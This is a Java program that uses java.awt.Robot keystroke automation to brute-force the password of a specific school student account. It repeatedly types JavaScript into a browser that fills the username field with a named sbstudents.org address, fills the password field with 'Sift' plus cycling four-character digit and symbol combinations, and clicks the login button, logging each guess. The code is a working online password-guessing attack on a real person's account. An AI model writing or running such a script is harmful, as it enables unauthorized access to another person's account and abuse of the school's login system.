import java.awt.AWTException;
import java.awt.Robot;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.awt.*;
import java.util.Scanner;
public class passCycle{
	Robot robot = new Robot();
	public static void main(String[] args) throws AWTException{
		new passCycle();
	}
	public passCycle() throws AWTException{/*
		int xOrigLocOfMos = mosX();
		int yOrigLocOfMos = mosY();
		hover(6, Integer.MAX_VALUE);
		final int bottomOfScreen = mosY();
		hover(Integer.MAX_VALUE, 6);
		final int rightOfScreen = mosX();
		//hover(xOrigLocOfMos,yOrigLocOfMos); //Returns mouse to original location*/
		Scanner input = new Scanner(System.in);
		while(1==1){
			int delay = input.nextInt();
			wait(5000);
			String[] pos1 = {"Sift"};
			//String[] pos2 = {"0","1","2","3","4","5","6","7","8","9","!","@","#","$","%","^","&","*"}
			int nums = 0;
			int chars = 0;
			boolean first = true;
			for(int a = 0;a!=15;a++){
				for(int b = 0;b!=15;b++){
					for(int c = 0;c!=15;c++){
						for(int d = 0;d!=15;d++){
							/*if(first){
								a=2;
								b=4;
								c=5;
								d=0;
								a=11;
								b=14;
								c=6;
								d=5;
								first = false;
							}*/
							//type(9);
							type("document.query");
							shift("S");
							type("elector");
							shift("9'");
							type("[name=uname]");
							shift("'0");
							type(".value=");
							shift("'");
							type("10024261");
							shift("2");
							type("sbstudents.org");
							shift("'");
							type(";");
							//enter();
							//type(9);

							type("document.query");
							shift("S");
							type("elector");
							shift("9'");
							type("[name=pw]");
							shift("'0");
							type(".value=");
							shift("'");

							shift(pos1[0].substring(0,1));
							type(pos1[0].substring(1));
							String text = pos1[0].substring(0,1)+pos1[0].substring(1);
							nums = 0;
							chars = 0;
							if(a<10){
								type(Integer.toString(a));
								text+=Integer.toString(a);
								nums++;
							}else{
								shift(Integer.toString(a-9));
								text+="[SHIFT]"+Integer.toString(a-9);
								chars++;
							}
							if(b<10){
								type(Integer.toString(b));
								text+=Integer.toString(b);
								nums++;
							}else{
								shift(Integer.toString(b-9));
								text+="[SHIFT]"+Integer.toString(b-9);
								chars++;
							}
							if(c<10){
								type(Integer.toString(c));
								text+=Integer.toString(c);
								nums++;
							}else{
								shift(Integer.toString(c-9));
								text+="[SHIFT]"+Integer.toString(c-9);
								chars++;
							}
							//System.out.println(chars+" "+d);
							while(chars==0&&d<10){
								d++;
							}
							//System.out.println(chars+" "+d);
							if(nums==0&&d>=10&&d<14){
								d=14;
							}
							if(d<10){
								type(Integer.toString(d));
								text+=Integer.toString(d);
							}else{
								shift(Integer.toString(d-9));
								text+="[SHIFT]"+Integer.toString(d-9);
							}
							shift("'");
							type(";");
							//enter();

							type("document.query");
							shift("S");
							type("elector");
							shift("9'");
							type("[name=dologin]");
							shift("'0");
							type(".click");
							shift("90");
							type(";");

							//wait(5000);
							enter();
							System.out.println(text);
							//click(3057,150);
							wait(delay);

						}
					}
				}
			}
		}
		//Replace with code!
	}


	private void type(int i){
		robot.keyPress(i);
		robot.keyRelease(i);
	}
	private void type(char c){
		type(KeyEvent.getExtendedKeyCodeForChar(c));
	}
	private void type(String s){
		for(int i =0;i!=s.length();i++){
			type(KeyEvent.getExtendedKeyCodeForChar(s.charAt(i)));
		}
	}
	public void wait(int milliseconds){
		for(int i = 0; i !=milliseconds/60000;i++)
		    robot.delay(60000);
		robot.delay(milliseconds);
	}
	public void click(int x,int y){
		hover(x, y);
		leftMouseDown(true);
		leftMouseDown(false);
	}
	public void rightClick(int x,int y){
		hover(x, y);
		rightMouseDown(true);
		rightMouseDown(false);
	}
	public void leftMouseDown(boolean tf){
		if(tf)
			robot.mousePress(InputEvent.BUTTON1_MASK);
		else
			robot.mouseRelease(InputEvent.BUTTON1_MASK);
	}
	public void centerMouseDown(boolean tf){
		if(tf)
			robot.mousePress(InputEvent.BUTTON2_MASK);
		else
			robot.mouseRelease(InputEvent.BUTTON2_MASK);
	}
	public void rightMouseDown(boolean tf){
		if(tf)
			robot.mousePress(InputEvent.BUTTON3_MASK);
		else
			robot.mouseRelease(InputEvent.BUTTON3_MASK);
	}
	public void hover(int x,int y){
		robot.mouseMove(x, y);
	}
	public int mosX(){
		return MouseInfo.getPointerInfo().getLocation().x;
	}
	public int mosY(){
		return MouseInfo.getPointerInfo().getLocation().y;
	}
	public void shift(String text){
		shift(true);
		type(text);
		shift(false);
	}
	public void shift(boolean tf){
		if(tf)
			robot.keyPress(16);
		else
		    robot.keyRelease(16);
	}

	public void control(String text){
		control(true);
		type(text);
		control(false);
	}
	public void control(boolean tf){
		if(tf)
			robot.keyPress(KeyEvent.VK_CONTROL);
		else
		    robot.keyRelease(KeyEvent.VK_CONTROL);
	}
	public void command(String text){
		command(true);
		type(text);
		command(false);
	}
	public void command(boolean tf){
		if(tf)
			robot.keyPress(KeyEvent.VK_META);
		else
            robot.keyRelease(KeyEvent.VK_META);
	}
	public void windows(boolean tf){
		if(tf)
			robot.keyPress(KeyEvent.VK_WINDOWS);
		else
            robot.keyRelease(KeyEvent.VK_WINDOWS);
	}
	public void windows(){
		windows(true);
		windows(false);
	}
	public void openProgram(String programName){
		windows();
		wait(200);
		type(programName);
		enter();
		wait(600);
	}
	public void enter(){
		robot.keyPress(KeyEvent.VK_ENTER);
		//wait(50);
		robot.keyRelease(KeyEvent.VK_ENTER);
		wait(250);
	}
}